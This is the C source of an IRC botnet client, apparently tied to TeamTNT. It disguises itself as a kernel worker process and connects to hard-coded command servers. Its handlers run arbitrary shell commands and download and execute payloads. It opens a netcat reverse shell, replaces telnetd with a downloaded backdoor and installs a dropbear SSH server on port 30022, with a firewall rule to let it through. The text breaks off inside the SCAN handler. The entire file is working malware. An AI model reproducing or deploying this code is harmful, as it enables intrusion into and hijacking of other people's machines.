#define STARTUP			// Start on startup?
#undef IDENT			// Only enable this if you absolutely have to
#define FAKENAME "kworker/08:15-ch"	// What you want this to hide as
#define CHAN "#chimaera"	// Channel to join
#define KEY ""		// The key of the channel
int numservers=2;		// Must change this to equal number of servers down there
char *servers[] = {		// List the servers in that format, always end in (void*)0
		"45.9.148.85",
        "irc.teamtnt.red",
        (void*)0
};
#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

int sock,changeservers=0;
int *pids, csum=0, actualparent;
char *server, *chan, *key, *nick, *ident, *user, disabled=0, execfile[256],dispass[256];
unsigned long spoofs=0, spoofsm=0, numpids=0;
int strwildmatch(const char* pattern, const char* string) {
	switch(*pattern) {
		case '\0': return *string;
		case '*': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case '?': return !(*string && !strwildmatch(pattern+1, string+1));
		default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
	}
}
int Send(int sock, char *words, ...) {
        static char textBuffer[1024];
        va_list args;
        va_start(args, words);
        vsprintf(textBuffer, words, args);
        va_end(args);
        return write(sock,textBuffer,strlen(textBuffer));
}
int mfork(char *sender) {
	unsigned int parent, *newpids, i;
	if (disabled == 1) {
		Send(sock,"NOTICE %s :Unable to comply.\n",sender);
		return 1;
	}
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}
unsigned long getspoof() {
	if (!spoofs) return rand();
	if (spoofsm == 1) return ntohl(spoofs);
	return ntohl(spoofs+(rand() % spoofsm)+1);
}
void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
 	if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		filter(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}
void identd() {
        int sockname,sockfd,sin_size,tmpsock,i;
        struct sockaddr_in my_addr,their_addr;
        char szBuffer[1024];
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(113);
        my_addr.sin_addr.s_addr = INADDR_ANY;
        memset(&(my_addr.sin_zero), 0, 8);
        if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
        if (listen(sockfd, 1) == -1) return;
        if (fork() == 0) return;
        sin_size = sizeof(struct sockaddr_in);
        if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
        for(;;) {
                fd_set bla;
                struct timeval timee;
                FD_ZERO(&bla);
                FD_SET(tmpsock,&bla);
                timee.tv_sec=timee.tv_usec=60;
                if (select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
                if (FD_ISSET(tmpsock,&bla)) break;
        }
        i = recv(tmpsock,szBuffer,1024,0);
        if (i <= 0 || i >= 20) exit(0);
        szBuffer[i]=0;
        if (szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
        if (szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
	Send(tmpsock,"%s : USERID : UNIX : %s\n",szBuffer,ident);
        close(tmpsock);
        close(sockfd);
        exit(0);
}
long pow(long a, long b) {
        if (b == 0) return 1;
        if (b == 1) return a;
        return a*pow(a,b-1);
}
u_short in_cksum(u_short *addr, int len) {
        register int nleft = len;
        register u_short *w = addr;
        register int sum = 0;
        u_short answer =0;
        while (nleft > 1) {
                sum += *w++;
                nleft -= 2;
        }
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w;
                sum += answer;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}
void get(int sock, char *sender, int argc, char **argv) {
        int sock2,i,d;
        struct sockaddr_in server;
        unsigned long ipaddr;
        char buf[1024];
        FILE *file;
        unsigned char bufm[4096];
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,"NOTICE %s :GET <host> <save as>\n",sender);
                exit(0);
        }
        if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Send(sock,"NOTICE %s :Unable to create socket.\n",sender);
                exit(0);
        }
        if (!strncmp(argv[1],"http://",7)) strcpy(buf,argv[1]+7);
        else strcpy(buf,argv[1]);
        for (i=0;i<strlen(buf) && buf[i] != '/';i++);
        buf[i]=0;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        if ((ipaddr = inet_addr(buf)) == -1) {
                struct hostent *hostm;
                if ((hostm=gethostbyname(buf)) == NULL) {
                        Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
                        exit(0);
                }
                memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
        }
        else server.sin_addr.s_addr = ipaddr;
        memset(&(server.sin_zero), 0, 8);
        if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
                Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
                exit(0);
        }

        Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */\x2a\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",buf+i+1,buf);
        Send(sock,"NOTICE %s :Receiving file.\n",sender);
        file=fopen(argv[2],"wb");
        while(1) {
                int i;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
                        for (d+=4;d<i;d++) fputc(bufm[d],file);
                        goto done;
                }
        }
        done:
        Send(sock,"NOTICE %s :Saved as %s\n",sender,argv[2]);
        while(1) {
                int i,d;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        close(sock2);
        exit(0);
}
void getspoofs(int sock, char *sender, int argc, char **argv) {
        unsigned long a=spoofs,b=spoofs+(spoofsm-1);
        if (spoofsm == 1) Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
        else Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
}
void version(int sock, char *sender, int argc, char **argv) {
        Send(sock,"NOTICE %s :Flibidi Flabedi Flupp\n Do you think of such an uncreative name again! xD",sender);
}
void nickc(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :NICK <nick>\n",sender);
                return;
        }
        if (strlen(argv[1]) >= 10) {
                Send(sock,"NOTICE %s :Nick cannot be larger than 9 characters.\n",sender);
                return;
        }
        Send(sock,"NICK %s\n",argv[1]);
}

void disable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :DISABLE <pass>\n",sender);
                Send(sock,"NOTICE %s :Current status is: %s.\n",sender,disabled?"Disabled":"Enabled and awaiting orders");
                return;
        }
	if (disabled) {
		Send(sock,"NOTICE %s :Already disabled.\n",sender);
		return;
	}
	if (strlen(argv[1]) > 254) {
                Send(sock,"NOTICE %s :Password too long! > 254\n",sender);
                return;
	}
        disabled=1;
	memset(dispass,0,256);
	strcpy(dispass,argv[1]);
	Send(sock,"NOTICE %s :Disable sucessful.\n");
}
void enable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :ENABLE <pass>\n",sender);
                Send(sock,"NOTICE %s :Current status is: %s.\n",sender,disabled?"Disabled":"Enabled and awaiting orders");
                return;
        }
	if (!disabled) {
		Send(sock,"NOTICE %s :Already enabled.\n",sender);
		return;
	}
	if (strcasecmp(dispass,argv[1])) {
		Send(sock,"NOTICE %s :Wrong password\n",sender);
		return;
	}
        disabled=0;
	Send(sock,"NOTICE %s :Password correct.\n",sender);
}
void spoof(int sock, char *sender, int argc, char **argv) {
        char ip[256];
        int i, num;
        unsigned long uip;
        if (argc != 1) {
                Send(sock,"NOTICE %s :Removed all spoofs\n",sender);
                spoofs=0;
                spoofsm=0;
                return;
        }
        if (strlen(argv[1]) > 16) {
                Send(sock,"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n",sender);
                return;
        }
        strcpy(ip,argv[1]);
        if (ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
        for (i=0, num=1;i<strlen(ip);i++) if (ip[i] == '.') num++;
        num=-(num-4);
        for (i=0;i<num;i++) strcat(ip,".0");
        uip=inet_network(ip);
        if (num == 0) spoofsm=1;
        else spoofsm=pow(256,num);
        spoofs=uip;
}
struct iphdr {
        unsigned int ihl:4, version:4;
        unsigned char tos;
        unsigned short tot_len;
        unsigned short id;
        unsigned short frag_off;
        unsigned char ttl;
        unsigned char protocol;
        unsigned short check;
        unsigned long saddr;
        unsigned long daddr;
};
struct udphdr {
        unsigned short source;
        unsigned short dest;
        unsigned short len;
        unsigned short check;
};
struct tcphdr {
        unsigned short source;
        unsigned short dest;
        unsigned long seq;
        unsigned long ack_seq;
        unsigned short res1:4, doff:4;
	unsigned char fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
        unsigned short window;
        unsigned short check;
        unsigned short urg_ptr;
};
struct send_tcp {
	struct iphdr ip;
	struct tcphdr tcp;
	char buf[20];
};
struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
	char buf[20];
};
unsigned int host2ip(char *sender,char *hostname) {
        static struct in_addr i;
        struct hostent *h;
        if((i.s_addr = inet_addr(hostname)) == -1) {
                if((h = gethostbyname(hostname)) == NULL) {
                        Send(sock, "NOTICE %s :Unable to resolve %s\n", sender,hostname);
                        exit(0);
                }
                bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
        }
        return i.s_addr;
}


void update(int sock, char *sender, int argc, char **argv) {
	int sock2,i,d;
	struct sockaddr_in server;
	unsigned long ipaddr;
	unsigned char dgcc;
	char buf[1024], *file;
	FILE *gcc;
	int parent=getpid();
	if (mfork(sender) != 0) return;
	if (argc < 2) {
		Send(sock,"NOTICE %s :UPDATEHTTP <host> <src:bin>\n",sender);
		exit(0);
	}
	if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		Send(sock,"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\n",sender);
		exit(0);
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(80);
	if ((ipaddr = inet_addr(argv[1])) == -1) {
		struct hostent *hostm;
		if ((hostm=gethostbyname(argv[1])) == NULL) {
			Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
			exit(0);
		}
		memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
	}
	else server.sin_addr.s_addr = ipaddr;
	memset(&(server.sin_zero), 0, 8);
	if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
		Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
		exit(0);
	}

	gcc=popen("gcc --help","r");
	if (gcc != NULL) {
		memset(buf,0,1024);
		fgets(buf,1024,gcc);
		if (!strstr(buf,"Usage")) dgcc=0;
		else dgcc=1;
		pclose(gcc);
	} else dgcc=0;

	for (i=0;i<strlen(argv[2]) && argv[2][i] != ':';i++);
	argv[2][i]=0;
	if (dgcc) file=argv[2];
	else file=argv[2]+i+1;
	
	Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */\x2a\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",file,argv[1]);
	Send(sock,"NOTICE %s :Receiving update.\n",sender);
	system("mkdir /tmp");
	if (dgcc) {
		FILE *file=fopen("/tmp/.c","wb");
		char bufm[4096];
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
				for (d+=4;d<i;d++) fputc(bufm[d],file);
				goto done;
			}
		}
		done:
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) fputc(bufm[d],file);
		}
		fclose(file);
		memset(buf,0,4096);
		sprintf(buf,"(gcc -o %s /tmp/.c; rm -rf /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1",execfile,parent,execfile);
	}
	else {
		FILE *file=fopen("/tmp/.o","wb");
		unsigned char bufm[4096];
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
				for (d+=4;d<i;d++) fputc(bufm[d],file);
				goto done2;
			}
		}
		done2:
		while(1) {
			int i,d;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) fputc(bufm[d],file);
		}
		fclose(file);
		memset(buf,0,4096);

		sprintf(buf,"export PATH=/var/bin:/usr/sbin:/bin:/usr/bin:/sbin;export HOME=/tmp;chmod +x /tmp/.o; trap '' 1;sh -c 'killall kaiten*;killall kt*;killall .o;sleep 5;trap "" 1;/tmp/.o '&");
	}
	close(sock);
	close(sock2);
	system(buf);
	kill(9,0);
	exit(0);
}

void move(int sock, char *sender, int argc, char **argv) {
        if (argc < 1) {
                Send(sock,"NOTICE %s :MOVE <server>\n",sender);
                exit(1);
        }
	server=strdup(argv[1]);
	changeservers=1;
	close(sock);
}

void hackpkg(int sock, char *sender, int argc, char **argv) {
        int sock2,i,d;
        struct sockaddr_in server;
        unsigned long ipaddr;
        char buf[1024];
        FILE *file;
	mkdir("/var/bin", 0775);
        unsigned char bufm[4096];
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,"NOTICE %s :HACKPGK <url> <binary name>\n",sender);
                exit(0);
        }
        if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Send(sock,"NOTICE %s :Unable to create socket.\n",sender);
                exit(0);
        }
        if (!strncmp(argv[1],"http://",7)) strcpy(buf,argv[1]+7);
        else strcpy(buf,argv[1]);
        for (i=0;i<strlen(buf) && buf[i] != '/';i++);
        buf[i]=0;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        if ((ipaddr = inet_addr(buf)) == -1) {
                struct hostent *hostm;
                if ((hostm=gethostbyname(buf)) == NULL) {
                        Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
                        exit(0);
                }
                memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
        }
        else server.sin_addr.s_addr = ipaddr;
        memset(&(server.sin_zero), 0, 8);
        if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
                Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
                exit(0);
        }

        Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: HackZilla/1.67 [en] (X11; U; Linux 2.2.16-3 x64)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */\x2a\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",buf+i+1,buf);
        Send(sock,"NOTICE %s :Receiving file.\n",sender);
        file=fopen(argv[2],"wb");
        while(1) {
                int i;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
                        for (d+=4;d<i;d++) fputc(bufm[d],file);
                        goto done;
                }
        }
        done:
        Send(sock,"NOTICE %s :Installed %s to hack path.\n",sender,argv[2]);
        while(1) {
                int i,d;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        close(sock2);
	char MoveIt[255];
	sprintf(MoveIt, "cat %s > /var/bin/%s",argv[2],argv[2]);
	system(MoveIt);
	char DeleteIt[255];
	sprintf(DeleteIt, "rm %s",argv[2],argv[2]);
	system(DeleteIt);
	char String[255];
	sprintf(String, "chmod 775 /var/bin/%s",argv[2]);
	system(String);
	char String2[255];
	sprintf(String2, "ls -l /var/bin/%s",argv[2]);
	system(String2);
        exit(0);
}

void help(int sock, char *sender, int argc, char **argv) {
        if (mfork(sender) != 0) return;
	Send(sock,"#@#@#@#@# :Flibidi Flabedi Flupp\n Do you think of such an uncreative name again! xD #@#@#@#@#@",sender); sleep(1);
        Send(sock,"NOTICE %s :PAN <target> <port> <secs>                       = function has been completely removed! signed by HildeGard\n",sender); sleep(1);
        Send(sock,"NOTICE %s :UDP <target> <port> <secs>                       = function has been completely removed! signed by HildeGard\n",sender); sleep(1);
        Send(sock,"NOTICE %s :UNKNOWN <target> <secs>                          = function has been completely removed! signed by HildeGard\n",sender); sleep(1);

        Send(sock,"NOTICE %s :NICK <nick>                                      = Changes the nick of the client\n",sender); sleep(1);
		Send(sock,"NOTICE %s :SERVER <server>                                  = Changes servers\n",sender); sleep(1);
        Send(sock,"NOTICE %s :GETSPOOFS                                        = Gets the current spoofing\n",sender); sleep(1);
        Send(sock,"NOTICE %s :SPOOFS <subnet>                                  = Changes spoofing to a subnet\n",sender); sleep(1);

        Send(sock,"NOTICE %s :DISABLE                                          = Disables all packeting from this client\n",sender); sleep(1);
        Send(sock,"NOTICE %s :ENABLE                                           = Enables all packeting from this client\n",sender); sleep(1);

	Send(sock,"NOTICE %s :GET <http address> <save as>                     = Downloads a file off the web and saves it onto the hd\n",sender); sleep(1);
	Send(sock,"NOTICE %s :UPDATE <http address> <src:bin>                  = Update this bot\n",sender); sleep(1);
	Send(sock,"NOTICE %s :HACKPKG <http address> <bin name>                = HackPkg is here! Install a bin, using http, no depends!\n",sender); sleep(1);
        Send(sock,"NOTICE %s :VERSION                                          = Requests version of client\n",sender); sleep(1);
        Send(sock,"NOTICE %s :HELP                                             = Displays this\n",sender); sleep(1);

	Send(sock,"NOTICE %s :IRC <command>                                    = Sends this command to the server\n",sender); sleep(1);
	Send(sock,"NOTICE %s :SH <command>                                     = Executes a command\n",sender); sleep(1);
	Send(sock,"NOTICE %s :ISH <command>                                    = SH, interactive, sends to channel\n",sender); sleep(1);
	Send(sock,"NOTICE %s :SHD <command>                                    = Executes a psuedo-daemonized command\n",sender); sleep(1);
	Send(sock,"NOTICE %s :GETBB <tftp server>                              = Get a proper busybox\n",sender); sleep(1);

        Send(sock,"NOTICE %s :INSTALL  <http server/file_name>                 = Download & install a binary to /var/bin \n",sender); sleep(1);
        Send(sock,"NOTICE %s :BASH <cmd>                                       = Execute commands using bash. \n",sender); sleep(1);
        Send(sock,"NOTICE %s :BINUPDATE <http:server/package>                  = Update a binary in /var/bin via wget \n",sender); sleep(1);
        Send(sock,"NOTICE %s :SCAN <nmap options>                              = Call the nmap wrapper script and scan with your opts. \n",sender); sleep(1);
	Send(sock,"NOTICE %s :RSHELL <server> <port>                           = Equates to nohup nc ip port -e /bin/sh\n",sender); sleep(1);
	Send(sock,"NOTICE %s :LOCKUP <http:server>                             = Kill telnet, d/l aes backdoor from <server>, run that instead.\n",sender); sleep(1);
	Send(sock,"NOTICE %s :GETSSH <http:server/dropbearmulti>               = D/l, install, configure and start dropbear on port 30022.\n",sender); sleep(1);
	exit(0);
}

void killall(int sock, char *sender, int argc, char **argv) {
        unsigned long i;
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        if (sender) Send(sock,"NOTICE %s :Killing pid %d.\n",sender,pids[i]);
                        kill(pids[i],9);
                }
        }
}
/*
void killd(int sock, char *sender, int argc, char **argv) {
	char buf[1024]={0};
	if (disabled == 1) return;
	sprintf(buf,"kill -9 %d;kill -9 0",actualparent);
	system(buf);
	exit(0);

}
*/

struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
        { "NICK", nickc },
        { "SERVER", move },
	{ "GETSPOOFS", getspoofs },
        { "SPOOFS", spoof },
	{ "HACKPKG", hackpkg },
	{ "DISABLE", disable },
        { "ENABLE", enable },
        { "UPDATE", update },
	{ "GET", get },
        { "VERSION", version },
        { "HELP", help },
{ (char *)0, (void (*)(int,char *,int,char **))0 } };
void _PRIVMSG(int sock, char *sender, char *str) {
        int i;
        char *to, *message;
        for (i=0;i<strlen(str) && str[i] != ' ';i++);
        str[i]=0;
        to=str;
        message=str+i+2;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
        if (*message == '!' && !strcasecmp(to,chan)) {
                char *params[12], name[1024]={0};
                int num_params=0, m;
                message++;
                for (i=0;i<strlen(message) && message[i] != ' ';i++);
                message[i]=0;
                if (strwildmatch(message,nick)) return;
                message+=i+1;
                if (!strncmp(message,"IRC ",4)) if (disabled) Send(sock,"NOTICE %s :Unable to comply.\n",sender); else Send(sock,"%s\n",message+4);
                if (!strncmp(message,"SH ",3)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s",message+3);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }

		if (!strncmp(message,"SHD ",4)) {
			char buf[1024];
			FILE *command;
			if (mfork(sender) != 0) return;
			memset(buf,0,1024);
			sprintf(buf,"export HOME=/tmp;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&",message+4);
			command=popen(buf,"r");
			while(!feof(command)) {
				memset(buf,0,1024);
				fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
				sleep(1);
			}
			pclose(command);
			exit(0);
		}

		if (!strncmp(message,"ISH ",3)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;%s",message+3);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
				Send(sock,"PRIVMSG %s :%s\n",CHAN,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
	}

		if (!strncmp(message,"GETBB ",6)) {
			char buf[1024];
			FILE *command;
			if (mfork(sender) != 0) return;
			memset(buf,0,1024);
			sprintf(buf,"export fileGet=busybox;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/\"$fileGet\" ] || [ ! -s /var/\"$fileGet\" ]) && tftp -g -r \"$fileGet\" %s && chmod +x \"$fileGet\" && ./\"$fileGet\" mkdir bin && ./\"$fileGet\" --install -s /var/bin && ls -l \"$fileGet\" || echo It appears we already have /var/\"$fileGet\")",message+6);
			command=popen(buf,"r");
			while(!feof(command)) {
				memset(buf,0,1024);
				fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
				sleep(1);
			}
			pclose(command);
			exit(0);
		}
		
		if (!strncmp(message,"GETSSH ",7)) {
			char buf[1024];
			FILE *command;
			if (mfork(sender) != 0) return;
			memset(buf,0,1024);
			sprintf(buf,"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;cd /tmp;export url=%s;name=`echo \"$url\" | sed 's#.\x2a/##'` && wget -O \"$name\" \"$url\";chmod +x \"$name\";mv \"$name\" /var/bin;ls -l /var/bin/\"$name\" && dss=/var/dbs/dropbear_dss_host_key;rsa=/var/dbs/dropbear_rsa_host_key;ecd=/var/dbs/dropbear_ecdsa_host_key;cd /var/bin;for i in dropbear dbclient dropbearkey dropbearconvert;do ln -s /var/bin/dropbearmulti $i;done;[ ! -d /var/dbs ] && mkdir /var/dbs;[ -f $dss ] || dropbearkey -t dss -f $dss;[ -f $rsa ] || dropbearkey -t rsa -f $rsa;[ -f $ecd ] || dropbearkey -t ecdsa -f $ecd;dropbear -r $dss -r $rsa -r $ecd -p 30022;iptables -I INPUT 1 -p tcp --dport 30022 -j ACCEPT",message+7);
			command=popen(buf,"r");
			while(!feof(command)) {
				memset(buf,0,1024);
				fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
				sleep(1);
			}
			pclose(command);
			exit(0);
		}

		if (!strncmp(message,"INSTALL ",8)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                 	sprintf(buf,"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \"$url\" | sed 's#.\x2a/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo \"$name either doesnt exist or eq 0 so we get\" && cd /tmp && wget -O \"$name\" \"$url\" && chmod +x \"$name\" && mv \"$name\" /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \"It appears I already have $name\")",message+8);
			command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
			}
                        pclose(command);
                        exit(0);
                }


		if (!strncmp(message,"BINUPDATE ",10)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                 	sprintf(buf,"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \"$url\" | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \"$name doesnt exist, perhaps you mean INSTALL?\"",message+10);
			command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
			}
                        pclose(command);
                        exit(0);
                }

		if (!strncmp(message,"LOCKUP ",7)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                 	sprintf(buf,"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/bd ] && cd /var/bin;wget -O bd %s;chmod +x /var/bin/bd;(killall -9 telnetd || kill -9 telnetd) && (nohup bd || trap '' 1 2 /var/bin/bd &)",message+7);
			command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
			}
                        pclose(command);
                        exit(0);
                }

		if (!strncmp(message,"RSHELL ",6)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nc %s -e /bin/sh '&",message+6);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }

		if (!strncmp(message,"SCAN ",5)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
